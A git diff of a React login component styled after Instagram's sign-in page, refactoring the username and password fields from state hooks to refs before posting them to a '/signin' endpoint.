@@ -5,15 +5,15 @@ import './App.css'
 function App() {
   const [showPassword, setShowPassword] = useState(false);
 
-  const [username, setUsername] = useState("");
-  const [password, setPassword] = useState("");
+  const usernameRef = useRef(null);
+  const passwordRef = useRef(null);
 
   const handleFormSubmit = async (e) => {
     e.preventDefault();
 
     const payload = {
-      username,
-      password
+      username: usernameRef.current.value,
+      password: passwordRef.current.value
     }
 
     const response = await api.post("/signin", payload, {
@@ -38,11 +38,11 @@ function App() {
          <img src="/instagram.png" className='logo' alt="" />
          <form onSubmit={handleFormSubmit}>
            <div className="form_input_field">
-             <input type="text" placeholder='Username, email address or mobile number' aria-label='Username' onClick={(e) => setUsername(e.target.value)} value={username} required />
+             <input type="text" placeholder='Username, email address or mobile number' aria-label='Username' ref={usernameRef} required />
              <label htmlFor="">Username, email address or mobile number</label>
            </div>
            <div className="form_input_field">
-             <input type={showPassword ? "text" : "password"} placeholder='Password' aria-label='Password' onClick={(e) => setPassword(e.target.value)} value={password} required />
+             <input type={showPassword ? "text" : "password"} placeholder='Password' aria-label='Password' ref={passwordRef} required />
              <label htmlFor="">Password</label>
              <span className='show-passwd'>
               <img src={!showPassword ? "/invisible-password.svg" : "/visible-password.svg"} alt="" onClick={() => setShowPassword(prev => !prev)} />
